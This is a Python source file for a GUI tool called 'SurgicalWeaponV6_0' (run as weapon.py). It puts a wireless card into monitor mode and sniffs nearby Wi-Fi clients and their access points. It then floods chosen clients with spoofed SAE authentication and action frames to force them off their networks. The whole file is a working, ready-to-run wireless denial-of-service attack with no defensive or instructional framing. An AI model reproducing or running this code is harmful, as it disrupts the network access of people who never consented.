import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SurgicalWeaponV6_0:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {} 
        self.active_attacks = set() # Stores (mac, mode)
        self.running = True
        
        self.set_monitor_mode()
        
        self.root = tk.Tk()
        self.root.title("Surgical Logic v6.0 - Debugged")
        self.root.geometry("850x650")
        self.root.configure(bg="#050505")

        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), height=20)
        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)

        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="OCV KICK", command=lambda: self.start_attack("OCV"), bg="#aa5500", fg="white", width=12).pack(side="left", padx=5)
        tk.Button(btn_frame, text="SAE RESET", command=lambda: self.start_attack("SAE"), bg="#880000", fg="white", width=12).pack(side="left", padx=5)
        tk.Button(btn_frame, text="STOP ALL", command=self.stop_active, bg="#444", fg="white", width=12).pack(side="left", padx=5)
        tk.Button(btn_frame, text="EXIT & CLEAN", command=self.shutdown, bg="#222", fg="#ff0000", width=12).pack(side="left", padx=5)

        self.status = tk.Label(self.root, text="System Ready.", bg="#050505", fg="#00FF41")
        self.status.pack()

        # Threads
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.fast_scanner, daemon=True).start()
        threading.Thread(target=self.attack_logic_loop, daemon=True).start()

    def set_monitor_mode(self):
        os.system("sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def hopper(self):
        while self.running:
            for ch in range(1, 14):
                if not self.active_attacks and self.running:
                    os.system(f"sudo iw dev {self.iface} set channel {ch}")
                    time.sleep(0.5)
                elif not self.running: break
                else: time.sleep(1)

    def fast_scanner(self):
        def callback(pkt):
            if pkt.haslayer(Dot11) and self.running:
                dot11 = pkt.getlayer(Dot11)
                if dot11.addr2 and dot11.addr3 and dot11.addr2 != dot11.addr3:
                    client, bssid = dot11.addr2, dot11.addr3
                    if client not in self.discovered and client != "ff:ff:ff:ff:ff:ff":
                        # Logic: Use 'channel' from RadioTap if possible, otherwise current_ch
                        self.discovered[client] = {"BSSID": bssid}
                        self.root.after(0, self.refresh_ui)
        sniff(iface=self.iface, prn=callback, store=0)

    def attack_logic_loop(self):
        while self.running:
            # Create a copy to avoid 'size changed during iteration' errors
            current_targets = list(self.active_attacks)
            for client, mode in current_targets:
                try:
                    data = self.discovered.get(client)
                    if not data: continue
                    b = data["BSSID"]
                    dot11 = RadioTap()/Dot11(addr1=b, addr2=client, addr3=b)
                    
                    if mode == "SAE":
                        pkt = dot11/Dot11Auth(algo=3, seqnum=1, status=0)
                    else: 
                        # FIXED: Changed 'action=4' to 'act=4' per Scapy specs
                        pkt = dot11/Dot11Action(category=10, act=4)/Raw(load=b"\xff\x0a\x01\x01")
                    
                    sendp(pkt, iface=self.iface, verbose=False, count=1)
                except Exception as e:
                    print(f"[!] Logic Error in loop: {e}")
            time.sleep(0.1)

    def start_attack(self, mode):
        for i in self.listbox.curselection():
            mac = list(self.discovered.keys())[i]
            self.active_attacks.add((mac, mode))
        self.refresh_ui()

    def stop_active(self):
        self.active_attacks.clear()
        self.refresh_ui()
        self.status.config(text="Attacks Stopped.")

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.discovered.items():
            is_hit = any(mac == m for m, mode in self.active_attacks)
            prefix = " [!] " if is_hit else " [+] "
            self.listbox.insert(tk.END, f"{prefix} {mac} | AP: {info['BSSID']}")

    def shutdown(self):
        self.running = False
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type managed")
        os.system(f"sudo ip link set {self.iface} up")
        os.system("sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
    else: SurgicalWeaponV6_0(sys.argv[1]).root.mainloop()
